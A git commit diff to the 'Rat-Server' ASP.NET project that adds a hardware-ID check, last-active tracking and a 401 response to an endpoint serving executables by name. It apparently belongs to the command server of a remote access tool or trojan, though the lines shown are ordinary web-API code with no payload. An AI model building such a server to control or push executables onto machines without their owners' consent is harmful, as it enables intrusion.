1ff3af101680c776ff1f2ba8b3d2267d45693642
Brendan Caldwell <brendanshauncaldwell@gmail.com>
2024-07-23 13:28:46 -0700

    Added authorization check for the device's hwid that calls the GetExeFile endpoint

--- Rat-Server/Controllers/ExeFileController.cs
+++ Rat-Server/Controllers/ExeFileController.cs
@@ -3,6 +3,7 @@ using Microsoft.AspNetCore.Mvc;
 using Microsoft.EntityFrameworkCore;
 using Rat_Server.Model.Context;
 using Rat_Server.Model.Entities;
+using System.Linq.Expressions;
 using static Org.BouncyCastle.Math.EC.ECCurve;
 
 namespace Rat_Server.Controllers
@@ -22,9 +23,21 @@ namespace Rat_Server.Controllers
 
         [HttpGet("GetExeFile/{Name}")]
         [ProducesResponseType<ExeFile>(StatusCodes.Status200OK)]
+        [ProducesResponseType(StatusCodes.Status401Unauthorized)]
         [ProducesResponseType(StatusCodes.Status404NotFound)]
-        public async Task<IActionResult> GetExeFile([FromHeader] string Hwid, string Name)
+        public async Task<IActionResult> GetExeFile([FromHeader] Guid Hwid, string Name)
         {
+            Device? device = await _context.Devices.SingleOrDefaultAsync(d => d.Hwid == Hwid);
+            if(device == null)
+            {
+                return Unauthorized();
+            }
+            else
+            {
+                device.LastActive = DateTime.Now;
+                await _context.SaveChangesAsync();
+            }
+
             ExeFile? exeFile = await _context.ExeFiles.SingleOrDefaultAsync(e => e.Name == Name);
             if(exeFile == null)
             {
